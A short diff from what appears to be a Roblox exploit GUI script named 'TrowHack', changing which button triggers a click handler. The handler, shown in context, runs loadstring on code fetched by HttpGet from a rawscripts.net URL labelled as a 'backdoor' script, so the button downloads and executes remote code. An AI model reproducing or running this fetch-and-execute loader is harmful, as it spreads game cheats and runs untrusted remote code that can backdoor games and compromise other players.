@@ -242,7 +242,7 @@ coroutine.wrap(WUGV_fake_script)()
 local function NUIMQW_fake_script() -- TrowHack.LocalScript 
 	local script = Instance.new('LocalScript', TrowHack)
 
-	prisonlife.MouseButton1Down:connect(function()
+	TrowHack.MouseButton1Down:connect(function()
 		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Trowscript-backdoor-63356"))()
 	end)
 	
